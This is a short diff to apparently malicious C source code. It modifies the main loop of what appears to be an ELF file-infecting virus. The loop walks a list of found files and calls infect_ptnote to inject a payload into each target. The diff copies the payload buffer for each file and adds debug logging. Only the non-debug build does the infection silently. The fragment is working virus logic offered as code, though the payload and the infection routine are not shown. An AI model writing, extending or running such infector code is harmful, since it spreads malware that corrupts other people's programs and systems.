@@ -67,13 +67,18 @@ int main(void) {
 
     LOG_DEBUG("infect_ptnote: inject payload at the end of the file target.");
     STAILQ_FOREACH(f, &files, link) {
+        unsigned char *payload_bin_cpy = malloc(payload_size);
+        memcpy(payload_bin_cpy, payload_bin, payload_size);
 #ifdef DEBUG
         total_file_found++;
-        if (infect_ptnote(f->path, payload_bin, payload_size) == 0)
+        LOG_DEBUG("infecting: %s.", f->path);
+        if (infect_ptnote(f->path, payload_bin_cpy, payload_size) == 0)
             total_file_infected++;
 #else
-        infect_ptnote(f->path, payload_bin, payload_size);
+        infect_ptnote(f->path, payload_bin_cpy, payload_size);
 #endif
+        free(payload_bin_cpy);
+
 
     }
     LOG_DEBUG("found %d files.", total_file_found);
